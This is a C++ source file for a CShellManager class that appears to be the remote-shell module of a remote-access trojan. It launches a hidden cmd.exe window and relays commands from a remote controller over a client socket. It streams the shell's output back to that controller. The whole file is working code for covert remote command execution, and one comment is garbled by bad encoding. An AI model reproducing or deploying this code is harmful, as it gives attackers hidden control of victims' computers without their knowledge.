// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "CmdManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CShellManager::CShellManager(CClientSocket *pClient,UINT ID):CManager(pClient)
{
	m_ID		=	ID	;
	SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	wchar_t  strShellPath[MAX_PATH] = {0};

	m_hReadPipeHandle	= NULL;
	m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
	m_hWritePipeShell	= NULL;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL; 
	sa.bInheritHandle = TRUE;


	if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
		if(m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
		return;
	}

	if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		if(m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
		if(m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
		return;
	}

	memset((void *)&si, 0, sizeof(si));
	memset((void *)&pi, 0, sizeof(pi));

	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput  = m_hReadPipeShell;
	si.hStdOutput = si.hStdError = m_hWritePipeShell; 

	GetSystemDirectory(strShellPath, MAX_PATH);
	lstrcat(strShellPath,_T("\\cmd.exe"));

	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return;
	}
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;
	HEADER cmdSend;
	cmdSend.ID	 = m_ID;
	cmdSend.flag = CLIENT_SHELL_START;
	cmdSend.datalength  =  0;
	/*BYTE	bToken = SHELL_TOKEN_START;*/
	Send((LPBYTE)&cmdSend, sizeof(HEADER));
	WaitForDialogOpen();
	m_hThreadRead =(HANDLE)_beginthreadex(NULL, 0, ReadPipeThread, (LPVOID)this, 0, NULL);
	m_hThreadMonitor = (HANDLE)_beginthreadex(NULL, 0, MonitorThread, (LPVOID)this, 0, NULL);
}

CShellManager::~CShellManager()
{
	TerminateThread(m_hThreadRead, 0);
	TerminateProcess(m_hProcessHandle, 0);
	TerminateThread(m_hThreadHandle, 0);
	WaitForSingleObject(m_hThreadMonitor, 2000);
	TerminateThread(m_hThreadMonitor, 0);

	if (m_hReadPipeHandle != NULL)
		DisconnectNamedPipe(m_hReadPipeHandle);
	if (m_hWritePipeHandle != NULL)
		DisconnectNamedPipe(m_hWritePipeHandle);
	if (m_hReadPipeShell != NULL)
		DisconnectNamedPipe(m_hReadPipeShell);
	if (m_hWritePipeShell != NULL)
		DisconnectNamedPipe(m_hWritePipeShell);

	CloseHandle(m_hReadPipeHandle);
	CloseHandle(m_hWritePipeHandle);
	CloseHandle(m_hReadPipeShell);
	CloseHandle(m_hWritePipeShell);

	CloseHandle(m_hProcessHandle);
	CloseHandle(m_hThreadHandle);
	CloseHandle(m_hThreadMonitor);
	CloseHandle(m_hThreadRead);
}

void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	DATA *pData = (DATA*)lpBuffer; 
	if ( SERVER_NEXT == pData->header.flag)
	{
		NotifyDialogIsOpen();
		return;
	}
	BYTE  *cmd = new BYTE[nSize];
	memcpy(cmd,lpBuffer,nSize);
	unsigned long	ByteWrite;
	WriteFile(m_hWritePipeHandle,cmd, nSize, &ByteWrite, NULL);
	//WriteFile(m_hWritePipeHandle, "\r\n",2,&ByteWrite,NULL);
}

UINT WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager *pThis = (CShellManager *)lparam;
	while (1)
	{
		Sleep(100);
		while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			if (BytesRead <= 0)
				break;

			memset(ReadBuff, 0, sizeof(ReadBuff));
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// ·¢ËÍÊý¾Ý

			HEADER pHeader;
			pHeader.ID	= pThis->m_ID;
			pHeader.flag= CLIENT_SHELL_DATA;
			pHeader.datalength	=	BytesRead;
			PBYTE pData = new BYTE[sizeof(HEADER)+BytesRead];
			memcpy(pData,&pHeader,sizeof(HEADER));
			memcpy(pData+sizeof(HEADER),lpBuffer,BytesRead);

			pThis->Send((LPBYTE)pData, sizeof(HEADER)+BytesRead);
			//pThis->Send((LPBYTE)aaa, BytesRead);
			LocalFree(lpBuffer);
			delete pData;
		}
	}
	return 0;
}

UINT WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
	TerminateThread(pThis->m_hThreadRead, 0);
	TerminateProcess(pThis->m_hProcessHandle, 1);
	pThis->m_pClient->Disconnect();
	return 0;
}
